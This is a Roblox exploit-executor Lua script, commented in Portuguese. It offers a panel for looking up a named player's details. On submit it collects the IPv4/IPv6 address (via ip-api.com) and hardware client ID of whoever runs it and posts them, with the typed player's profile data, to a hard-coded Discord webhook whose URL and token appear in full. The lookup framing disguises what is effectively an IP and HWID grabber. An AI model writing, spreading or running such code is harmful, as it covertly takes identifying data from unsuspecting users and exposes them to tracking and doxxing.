local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local gui = player:WaitForChild("PlayerGui")

-- Variáveis de controle
local panelVisible = false
local panelFrame
local textBox
local submitButton
local isDragging = false
local dragStart = nil
local startPos = nil
local openButton

-- Função para criar o painel
local function createPanel()
    -- Verifica se o ScreenGui já existe, se não, cria um novo
    local screenGui = gui:FindFirstChild("ScreenGui")
    if not screenGui then
        screenGui = Instance.new("ScreenGui")
        screenGui.Name = "ScreenGui"
        screenGui.Parent = gui
    end

    -- Criando o painel
    panelFrame = Instance.new("Frame")
    panelFrame.Size = UDim2.new(0, 300, 0, 150)
    panelFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
    panelFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    panelFrame.BackgroundTransparency = 0.5
    panelFrame.Parent = screenGui

    -- Caixa de texto para o nome do jogador
    textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(0, 200, 0, 30)
    textBox.Position = UDim2.new(0, 50, 0, 40)
    textBox.Text = "Digite o nome do jogador"
    textBox.Parent = panelFrame

    -- Botão para enviar
    submitButton = Instance.new("TextButton")
    submitButton.Size = UDim2.new(0, 100, 0, 30)
    submitButton.Position = UDim2.new(0, 100, 0, 80)
    submitButton.Text = "Enviar"
    submitButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    submitButton.Parent = panelFrame

    -- Função de envio dos dados para o Discord
    submitButton.MouseButton1Click:Connect(function()
        local playerName = textBox.Text
        local playerToFetch = Players:FindFirstChild(playerName)

        if playerToFetch then
            local userId = playerToFetch.UserId
            local displayName = playerToFetch.DisplayName
            local userName = playerToFetch.Name
            local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150&format=png"

            -- Coleta dos IPs (IPv4 e IPv6)
            local function getIpData()
                local ipData = game:HttpGet("http://ip-api.com/json")
                local ipDataDecoded = HttpService:JSONDecode(ipData)
                local ipv4 = ipDataDecoded.query
                local ipv6 = ipDataDecoded.version == "IPv6" and ipDataDecoded.query or nil
                return ipv4, ipv6
            end

            local ipv4, ipv6 = getIpData()  -- Chama a função para coletar os IPs

            -- Webhook URL (substitua pelo seu webhook)
            local webhookUrl = "https://discord.com/api/webhooks/1331661006677737564/_vQxIjy8Yh8JwKdBXEWwlIS3JsUFyEb3-_CSi92wWDiDpH6NNjpERGdXoMiSWZQJ62aN"
            
            -- Dados a serem enviados para o Discord
            local webhookData = {
                ["avatar_url"] = avatarUrl,
                ["content"] = "",
                ["embeds"] = {
                    {
                        ["author"] = {
                            ["name"] = "Informações do jogador",
                            ["url"] = "https://roblox.com",
                        },
                        ["description"] = string.format(
                            "__[Player Info](https://www.roblox.com/users/%d)__" ..
                            " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**IPv4:** %s\n**IPv6:** %s" ..
                            "\n**Hwid:** %s",
                            userId, displayName, userName, userId, ipv4, ipv6 or "N/A", game:GetService("RbxAnalyticsService"):GetClientId()
                        ),
                        ["type"] = "rich",
                        ["color"] = tonumber("0xFFD700"),
                    }
                }
            }

            -- Enviar os dados para o Discord
            local data = HttpService:JSONEncode(webhookData)
            local headers = {["content-type"] = "application/json"}
            local request = http_request or request or HttpPost or syn.request
            local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
            request(abcdef)
        else
            print("Jogador não encontrado!")
        end
    end)
end

-- Função para alternar a visibilidade do painel
local function togglePanel()
    if panelVisible then
        panelFrame:Destroy()  -- Fecha o painel
        panelVisible = false
    else
        createPanel()  -- Abre o painel
        panelVisible = true
    end
end

-- Criando a bolinha para abrir o painel
local function createOpenButton()
    openButton = Instance.new("TextButton")
    openButton.Size = UDim2.new(0, 50, 0, 50)
    openButton.Position = UDim2.new(0.9, -60, 0.9, -60) -- Posicionando a bolinha no canto inferior direito
    openButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Cor vermelha
    openButton.Text = "Open"
    openButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    openButton.TextScaled = true
    openButton.Parent = gui

    openButton.MouseButton1Click:Connect(function()
        togglePanel()  -- Alterna entre abrir e fechar o painel
    end)
end

-- Inicialização
local function initialize()
    createOpenButton()  -- Cria a bolinha de abrir/fechar o painel
end

initialize()
